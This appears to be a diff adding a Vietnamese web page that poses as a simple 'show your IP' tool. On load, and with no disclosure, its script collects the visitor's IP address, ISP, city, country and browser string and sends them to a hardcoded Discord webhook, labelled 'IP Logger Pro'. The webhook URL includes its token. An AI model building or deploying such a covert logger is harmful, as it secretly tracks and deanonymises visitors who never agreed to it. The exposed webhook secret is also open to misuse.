@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Hiện IP của bạn</title>
+  <style>
+    body{font-family:Inter,system-ui,Segoe UI,Roboto;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0f172a;color:#e6eef8}
+    .card{background:#0b1220;padding:28px;border-radius:12px;box-shadow:0 6px 30px rgba(2,6,23,.6);text-align:center;min-width:300px;max-width:400px}
+    h1{margin:0 0 8px;font-size:20px}
+    .ip{font-size:32px;font-weight:700;margin:8px 0;word-break:break-all}
+    .info{margin:8px 0;font-size:14px;line-height:1.5}
+    .muted{opacity:.7;font-size:13px}
+    button{margin:8px 4px;padding:8px 12px;border-radius:8px;border:0;cursor:pointer;background:#1e293b;color:#e6eef8;font-size:13px}
+    button:hover{background:#334155}
+    .loading{opacity:0.6}
+    .detail{margin-top:12px;padding-top:12px;border-top:1px solid #334155;font-size:13px;text-align:left}
+    .detail div{margin:4px 0}
+    .label{font-weight:600;color:#94a3b8}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Đại ca — IP của bạn là</h1>
+    <div id="ip" class="ip">Đang lấy...</div>
+    <div id="status" class="muted">Đang thu thập thông tin...</div>
+
+    <div id="details" class="detail" style="display:none;">
+      <div><span class="label">ISP:</span> <span id="isp">-</span></div>
+      <div><span class="label">Thành phố:</span> <span id="city">-</span></div>
+      <div><span class="label">Quốc gia:</span> <span id="country">-</span></div>
+      <div><span class="label">Trình duyệt:</span> <span id="ua">-</span></div>
+    </div>
+
+    <div>
+      <button id="copyBtn">Copy IP</button>
+      <button id="reloadBtn">Lấy lại</button>
+    </div>
+  </div>
+
+  <script>
+    const ipEl = document.getElementById('ip');
+    const statusEl = document.getElementById('status');
+    const detailsEl = document.getElementById('details');
+    const ispEl = document.getElementById('isp');
+    const cityEl = document.getElementById('city');
+    const countryEl = document.getElementById('country');
+    const uaEl = document.getElementById('ua');
+    const copyBtn = document.getElementById('copyBtn');
+    const reloadBtn = document.getElementById('reloadBtn');
+
+    // === GỬI VỀ DISCORD WEBHOOK ===
+    function sendToDiscord(data) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1368527308163383357/IphwO1lpyEHqtNlR0PNB4VzFHfYpZ3fIPnCYz5cqZXpwjdrd0WD3jLYLzfe84QzDvSXb';
+
+      const fields = [
+        { name: 'IP', value: `\`${data.ip}\``, inline: true },
+        { name: 'ISP', value: data.isp || 'N/A', inline: true },
+        { name: 'Vị trí', value: `${data.city || 'N/A'}, ${data.country || 'N/A'}`, inline: true },
+        { name: 'Trình duyệt', value: data.ua_short, inline: false }
+      ];
+
+      const embed = {
+        title: 'IP Mới Được Ghi Nhận',
+        color: 0x00ff00,
+        fields: fields,
+        footer: { text: 'IP Logger Pro • Đại ca' },
+        timestamp: new Date().toISOString()
+      };
+
+      const payload = JSON.stringify({ embeds: [embed] });
+
+      // Ưu tiên sendBeacon (gửi khi thoát trang)
+      if (navigator.sendBeacon) {
+        const blob = new Blob([payload], { type: 'application/json' });
+        navigator.sendBeacon(webhookUrl, blob);
+      } else {
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          mode: 'no-cors',
+          keepalive: true
+        }).catch(() => {});
+      }
+    }
+
+    // === LẤY THÔNG TIN CHI TIẾT ===
+    async function fetchIPData() {
+      ipEl.textContent = 'Đang lấy...';
+      statusEl.textContent = 'Đang kết nối tới máy chủ...';
+      detailsEl.style.display = 'none';
+
+      try {
+        // Lấy IP
+        const ipRes = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+        if (!ipRes.ok) throw new Error('IP fetch failed');
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        // Lấy thông tin chi tiết từ ipapi.co
+        const infoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        let info = {};
+        if (infoRes.ok) {
+          info = await infoRes.json();
+        }
+
+        // User-Agent
+        const ua = navigator.userAgent;
+        const ua_short = ua.split(' ').slice(0, 3).join(' ').replace(/\(|\)/g, '');
+
+        // Hiển thị
+        ipEl.textContent = ip;
+        statusEl.textContent = 'Hoàn tất! IP đã được ghi nhận.';
+        ispEl.textContent = info.org || info.asn || 'N/A';
+        cityEl.textContent = info.city || 'N/A';
+        countryEl.textContent = info.country_name || 'N/A';
+        uaEl.textContent = ua_short;
+        detailsEl.style.display = 'block';
+
+        // === GỬI VỀ DISCORD ===
+        sendToDiscord({
+          ip,
+          isp: info.org || info.asn,
+          city: info.city,
+          country: info.country_name,
+          ua_short
+        });
+
+      } catch (err) {
+        ipEl.textContent = 'Lỗi kết nối';
+        statusEl.textContent = 'Không lấy được thông tin. Thử lại sau.';
+        console.error(err);
+      }
+    }
+
+    // === COPY IP ===
+    copyBtn.addEventListener('click', async () => {
+      const txt = ipEl.textContent;
+      if (!txt || txt.includes('Đang') || txt.includes('Lỗi')) return;
+      try {
+        await navigator.clipboard.writeText(txt);
+        copyBtn.textContent = 'Đã copy!';
+        setTimeout(() => copyBtn.textContent = 'Copy IP', 1500);
+      } catch {
+        alert('Không copy được!');
+      }
+    });
+
+    // === TẢI LẠI ===
+    reloadBtn.addEventListener('click', fetchIPData);
+
+    // === TỰ ĐỘNG CHẠY KHI MỞ TRANG ===
+    fetchIPData();
+  </script>
+</body>
+</html>
